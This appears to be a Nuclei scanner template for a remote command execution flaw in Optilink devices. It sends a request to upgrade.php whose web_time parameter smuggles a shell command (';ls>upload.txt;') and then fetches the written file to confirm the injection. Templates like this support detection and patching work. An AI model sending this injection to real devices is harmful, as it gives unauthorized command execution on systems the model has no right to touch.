id: Optilink-upgrade-RCE

info:
  name: Optilink-upgrade-RCE
  author: iSee857
  severity: high
  description: Optilink-upgrade-RCE

http:

  - raw:
      - |              
        GET /cgi/fsystem/upgrade.php?time=1&web_time=;ls>upload.txt; HTTP/1.1
        Host: 

      - |              
        GET /cgi/fsystem/upload.txt HTTP/1.1
        Host:  

    matchers:     
      - type: word
        part: body
        words:
          - "upload.txt"
        condition: and
      - type: status
        status:
          - 200